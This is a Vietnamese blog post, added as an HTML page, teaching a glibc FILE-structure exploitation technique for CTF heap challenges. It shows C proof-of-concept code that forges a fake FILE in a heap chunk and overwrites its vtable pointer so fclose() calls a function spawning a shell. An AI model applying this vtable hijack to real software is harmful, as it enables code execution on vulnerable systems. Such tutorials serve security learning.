@@ -1,0 +1,237 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>File Abusing - HarDToBelieve's Blog</title>
+  <meta name="author" content="HarDToBelieve">
+
+  
+  <meta name="description" content="File Abusing written in exploitation Tiếp tục chuyên đề về heap, nhưng lần này sẽ là một heap đặc biệt: FILE Đôi điều về con trỏ FILE: Như chúng ta &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hardtobelieve.github.io/blog/2016/07/30/file-abusing">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="HarDToBelieve's Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  
+
+</head>
+
+  <body>
+    <a href="/" class="home-icon">
+      <img src="/images/home.png"/>
+    </a>
+
+    <article role="article" class="full-single-article">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-10 col-md-offset-1">
+        <h1>File Abusing</h1>
+        <div class="meta">
+          written 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2016-07-30T00:00:29+07:00" pubdate data-updated="true"></time>
+          
+
+in
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/exploitation/'>exploitation</a>
+  
+</span>
+
+
+        </div>
+        <p>Tiếp tục chuyên đề về heap, nhưng lần này sẽ là một heap đặc biệt: FILE</p>
+
+<!--more-->
+
+
+<h1>Đôi điều về con trỏ FILE:</h1>
+
+<p>Như chúng ta đã biết, trong ngôn ngữ C, muốn mở một file để thao tác trên đó ta sẽ sử dụng câu lệnh có dạng như sau:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;tmp&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Đây là 1 con trỏ, mà đã là con trỏ muốn sử dụng thì sẽ luôn cần đến malloc/free để cấp phát và thu hồi bộ nhớ cho nó. Ta có thể kiểm chứng bằng cách code thử vài dòng và quan sát trong gdb:</p>
+
+<p><img src="/assets/fileabusing/FileStructure.png" alt="File structure" /></p>
+
+<p>Ta thấy có rất nhiều giá trị đã được gán vào vùng nhớ này, đó chính là các giá trị trong <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libio.h;h=3cf1712ea98d3c253f418feb1ef881c4a44649d5;hb=HEAD#l245">FILE STRUCTURE</a>. Nhìn thật kinh khủng !! Nhưng nói chung sẽ có 2 phần lớn đáng chú ý:</p>
+
+<ul>
+<li>Các pointer trỏ vào rất nhiều vùng nhớ như stream, flag, &hellip;</li>
+<li>Danh sách địa chỉ các hàm của con trỏ ( struct _IO_jump_t* vtable )</li>
+</ul>
+
+
+<p><img src="/assets/fileabusing/glibc-FILE-vtable.png" alt="glibc-FILE-vtable" /></p>
+
+<p>Như vậy khi ta gọi các hàm xử lý file ( fopen, fclose, &hellip; ), chương trình sẽ nhảy vào địa chỉ tương ứng được lưu ở đây. Câu hỏi được đặt ra là nếu ta có thể ghi đè địa chỉ ta muốn vào bảng jump đấy thì sao?</p>
+
+<h1>Fake file pointer</h1>
+
+<p>Mục đích của chúng ta sẽ là tạo ra một con trỏ file giả, thay đổi giá trị trỏ vào bảng các hàm xử lý để có thể gọi 1 hàm bất kỳ mà ta muốn. Thay vì trace theo từng dòng lệnh của code, ta sẽ đi theo kiểu &ldquo;lần mò&rdquo;. Cứ code và chạy thử 1 đoạn cái đã, để đơn giản, ta sẽ thêm 1 hàm <code>pwned()</code> vào chương trình :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">pwned</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin//sh&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
+</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">FILE</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span> <span class="p">)</span> <span class="p">);</span>
+</span><span class='line'><span class="n">fclose</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Và tất nhiên sẽ bị <em>Segmentation fault</em></p>
+
+<p><img src="/assets/fileabusing/seg_1.png" alt="seg_1" /></p>
+
+<p>Nguyên nhân gây ra lỗi này là do chương trình truy xuât vào ô nhớ <code>r8 + 0x8</code> mà <code>r8</code> lại bằng 0. Quan sát ở phía trên thì thấy <code>r8</code> nhận giá trị từ <code>rbx + 0x88</code>, trong đó rbx lại là địa chỉ heap mà ta vừa malloc. Hmm, ta thử điền bừa xem, vì dù sao nếu xem ở  ảnh ban đầu ( khi fopen với 1 con trỏ file thực sự ) thì ô nhớ <code>r8 + 0x8</code> cũng mang giá trị NULL.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">FILE</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span> <span class="p">)</span> <span class="p">);</span>
+</span><span class='line'><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span> <span class="o">+</span> <span class="mh">0x88</span> <span class="o">/</span> <span class="mi">8</span><span class="p">))</span> <span class="o">=</span> <span class="n">a</span>
+</span><span class='line'><span class="n">fclose</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>May quá, vậy là nó nhảy thẳng đến lệnh call</p>
+
+<p><img src="/assets/fileabusing/seg_2.png" alt="seg_2" /></p>
+
+<p>Lần này <em>Segmentation fault</em> cũng giống lần trước, là do chương trình truy xuất vào ô nhớ không tồn tại. <code>rax</code> đc lấy giá trị từ <code>rbx + 0xd8</code>. Vậy là rax sẽ là struct _IO_jump_t* vtable, sau đó chương trình sẽ gọi ra hàm thứ 3 trong bảng đó. OK, vậy ta sẽ cho giá trị của ô này bằng với địa chỉ của ô chứa hàm <code>pwned()</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">FILE</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span> <span class="o">+</span> <span class="mh">0x88</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">a</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pwned</span><span class="p">;</span>
+</span><span class='line'><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span> <span class="o">+</span> <span class="mh">0xd8</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">a</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">fclose</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Chạy thử nào:</p>
+
+<p><img src="/assets/fileabusing/pwned.png" alt="pwned" /></p>
+
+<p>À ha, PWNED!!!!</p>
+
+<h1>Nhận xét</h1>
+
+<p>Trong các kỳ thi CTF, hầu như không có chuyện đề bài cho ta fclose() một thằng vô danh nào đấy được. Nên ta thường phải kết hợp kỹ thuật này với một số kỹ thuật heap khác như <code>heap overflow</code> hay <code>user after free</code></p>
+
+
+        <hr class="divider-short"/>
+
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+<hr class="divider-short"/>
+
+<div class="archive-link">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-8 col-md-offset-2">
+        
+          <a class="pull-left" href="/blog/2016/06/14/fastbin/" title="Previous Post: Fastbin technique">&laquo; Previous: Fastbin technique</a>
+        
+
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+    <footer id="footer" class="her-row">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-1">
+  <a href="/"><h4>Home</h4></a>
+</div>
+
+<div class="col-md-2">
+  <div class="social-icon-list">
+    
+
+    
+
+    
+
+    
+  </div>
+</div>
+
+<div class="pull-right">
+  <h4>Powered by <a href="http://octopress.org/">Octopress</a>. Designed by <a href="http://AdrianArtiles.com">Adrian Artiles</a>.</h4>
+</div>
+
+
+    </div>
+  </div>
+</footer>
+
+    
+  </body>
+</html>
